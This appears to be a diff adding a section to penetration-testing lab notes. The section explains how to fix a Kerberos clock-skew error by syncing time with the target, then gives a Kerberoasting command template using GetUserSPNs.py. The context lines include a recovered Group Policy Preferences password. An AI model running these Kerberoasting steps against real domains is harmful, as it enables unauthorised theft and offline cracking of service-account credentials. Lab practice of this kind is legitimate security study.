@@ -34,3 +34,12 @@ edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/
 
 GPPstillStandingStrong2k18
 ```
+
+# Fixing "Kerberos SessionError"
+
+![image](https://github.com/user-attachments/assets/4585b5a6-d0dc-4cd3-8be0-4c1bebf6f18d)
+
+1. If you are not currently running as the root user, switch to the root user by running the “su” command
+2. Run “timedatectl set-ntp off” to disable the Network Time Protocol from auto-updating
+3. Run “rdate -n [IP of Target]” to match your date and time with the date and time of the your target machine
+4. Run your Kerberoast command (which should be GetUserSPNs.py [Domain Name].local/[username]:[password] -dc-ip [Domain Controller IP] -request)
